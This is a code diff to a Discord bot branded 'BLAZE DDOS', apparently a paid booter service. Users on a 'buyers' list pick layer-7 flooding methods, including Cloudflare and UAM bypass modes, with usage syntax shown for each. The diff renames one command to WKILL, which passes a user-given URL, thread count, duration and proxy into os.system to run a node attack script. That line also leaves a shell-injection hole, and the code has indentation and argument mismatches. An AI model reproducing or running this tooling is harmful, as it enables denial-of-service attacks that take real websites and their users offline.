@@ -237,7 +237,7 @@ async def Methods(ctx):
 	else:
 		embet = discord.Embed(title="🚀 **BLAZE DDOS** 🚀", color=discord.Colour.random())
 		embet.add_field(name="**Methods Layer4**", value="```\nDDOS\n```")
-		embet.add_field(name="**Methods Layer7**", value="```\nSLOW\nHYPER\nUAM\nUAM-BYPASS\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKETS\nIO-STRESSER\nCLOUDFLARE\nCF-BYPASS\nKATA-DDOS\nHTTP-BROWSER(BROWSER)```")
+		embet.add_field(name="**Methods Layer7**", value="```\nSLOW\nHYPER\nUAM\nUAM-BYPASS\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKETS\nIO-STRESSER\nCLOUDFLARE\nCF-BYPASS\nKATA-DDOS\nWKILL```")
 		embet.set_footer(text=f"© Owner : DiozYzz#3514 | All Methods Show")
 		
 		await ctx.channel.send(embed=embet)
@@ -266,7 +266,7 @@ async def Commands(ctx):
 		embed.add_field(name="**HTTP-RAW**", value="```!HTTP_RAW [url] [time]```")
 		embed.add_field(name="**HTTP-RAND**", value="```!HTTP_RAND [url] [time]```")
 		embed.add_field(name="**HTTP-SOCKETS**", value="```!HTTP_SOCKETS [url] [request/ip] [time]```")
-		embed.add_field(name="**BROWSER**", value="```!HTTP-BROWSER IF CANT !BROWSER [url] [mode] [time] [threads] [req] [proxy] ```")
+		embed.add_field(name="**BROWSER**", value="```!WKILL [url] [threads] [time] [proxy] ```")
 		embed.add_field(name="**IO-STRESSER**", value="```!IO_STRESSER [url] [time] [thread] [bypass/proxy]```")
 		embed.add_field(name="**CLOUDFLARE**", value="```!CF [url] [time] [thread]```")
 		embed.add_field(name="**CF-BYPASS**", value="```!CF_BYPASS [url] [thread<50] [time]```")
@@ -363,7 +363,7 @@ async def DDOS(ctx, url, time):
 		
 @bot.command()
 
-async def BROWSER(ctx, url, threads, time , req , mode , proxy):
+async def WKILL(ctx, url, threads, time , req , mode , proxy):
 
 	if ctx.author.id not in buyers:		embedc = discord.Embed(title="🚀 **BLAZE DDOS** 🚀", color=0xfcb103)
 
@@ -379,20 +379,19 @@ async def BROWSER(ctx, url, threads, time , req , mode , proxy):
 
 		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
 
-		embed.add_field(name="**Target**", value=f"`{target}`")
+		embed.add_field(name="**Target**", value=f"`{url}`")
 
 		embed.add_field(name="**Duration**", value=f"`{time}`")
 
 		embed.add_field(name="**Threads**", value=f"`{threads}`")
 
-                embed.add_field(name="**Request**", value=f"` {req}`")
-		
-                embed.add_field(name="**Mode**", value=f"` {mode}`")
-	
-		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
+                embed.add_field(name="**Proxy**", value=f"` {proxy}`")
 
-		
-		
+
+
+
+
+
 		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
 
 		rdma1 = random.choice(ma1)
@@ -409,7 +408,7 @@ async def BROWSER(ctx, url, threads, time , req , mode , proxy):
 
 		
 
-		os.system(f"node HTTP-BROWSER.js {mode} {target} {time} {threads} {req} {proxy}")
+		os.system(f"node POWERFUL.js {url} {threads} {time} {proxy}")
 		
 		
 		
